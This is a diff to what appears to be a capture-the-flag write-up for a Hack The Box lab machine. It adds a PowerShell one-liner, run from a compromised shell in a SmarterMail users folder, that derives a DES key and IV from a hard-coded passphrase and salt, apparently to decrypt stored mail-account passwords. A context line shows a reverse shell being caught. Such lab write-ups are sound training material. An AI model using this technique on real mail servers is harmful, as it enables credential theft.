@@ -1166,4 +1166,23 @@ connect to [10.10.15.166] from (UNKNOWN) [10.129.82.45] 50997
 ```
 
 ![img](./img/Captura10.png)
+
+
+``` powershell
+
+powershell -c "$salt = [byte[]](155, 26, 93, 86); $pdb = New-Object System.Security.Cryptography.PasswordDeriveBytes('a3oij89FF!apoife', $salt); $key = $pdb.GetBytes(8); $iv = $pdb.GetBytes(8); Write-Host 'Key:' ($key | ForEach-Object { $_.ToString('X2') }) -Separator ' '; Write-Host 'IV:' ($iv | ForEach-Object { $_.ToString('X2') }) -Separator ' '"
+
+
+```
+
+``` powershell
+
+C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b>powershell -c "$salt = [byte[]](155, 26, 93, 86); $pdb = New-Object System.Security.Cryptography.PasswordDeriveBytes('a3oij89FF!apoife', $salt); $key = $pdb.GetBytes(8); $iv = $pdb.GetBytes(8); Write-Host 'Key:' ($key | ForEach-Object { $_.ToString('X2') }) -Separator ' '; Write-Host 'IV:' ($iv | ForEach-Object { $_.ToString('X2') }) -Separator ' '"
+powershell -c "$salt = [byte[]](155, 26, 93, 86); $pdb = New-Object System.Security.Cryptography.PasswordDeriveBytes('a3oij89FF!apoife', $salt); $key = $pdb.GetBytes(8); $iv = $pdb.GetBytes(8); Write-Host 'Key:' ($key | ForEach-Object { $_.ToString('X2') }) -Separator ' '; Write-Host 'IV:' ($iv | ForEach-Object { $_.ToString('X2') }) -Separator ' '"
+Key: B4 3F 84 D1 10 B4 E9 91
+IV: 01 D8 AE E6 49 AD 92 27
+
+C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b>
+
+```
                       
